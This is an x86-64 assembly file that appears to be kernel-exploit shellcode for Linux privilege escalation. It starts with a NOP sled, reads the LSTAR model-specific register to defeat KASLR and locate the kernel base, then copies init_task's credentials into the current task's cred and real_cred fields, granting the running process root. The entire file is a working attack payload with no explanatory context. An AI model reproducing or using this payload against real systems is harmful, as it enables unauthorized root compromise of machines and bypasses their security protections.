    .intel_syntax noprefix
    .global userland
    .global userland_end

    .equ MSR_LSTAR, 0xc0000082
    .equ KASLR_LSTAR, 0x1000000
    .equ INIT_TASK, 0x1a0c900
    .equ TASK_CRED, 0x6e0
    .equ TASK_REAL_CRED, 0x6e8
    .equ STRUCT_CRED_USAGE, 0
    .equ PERCPU_CURRENT, 0x30a00

userland:
    .fill 0xbc0, 1, 0x90

    push rdi
    push rsi
    push rcx
    push rax
    push rdx

    mov ecx, MSR_LSTAR
    rdmsr
    shl rdx, 32
    or  rdx, rax
    sub rdx, KASLR_LSTAR
    mov rsi, rdx

    mov rcx, qword ptr [rsi + INIT_TASK + TASK_CRED]
    add qword ptr [rcx + STRUCT_CRED_USAGE], 2

    mov rdi, qword ptr gs:[PERCPU_CURRENT]
    mov qword ptr [rdi + TASK_CRED], rcx
    mov qword ptr [rdi + TASK_REAL_CRED], rcx

    pop rdx
    pop rax
    pop rcx
    pop rsi
    pop rdi
    ret
userland_end: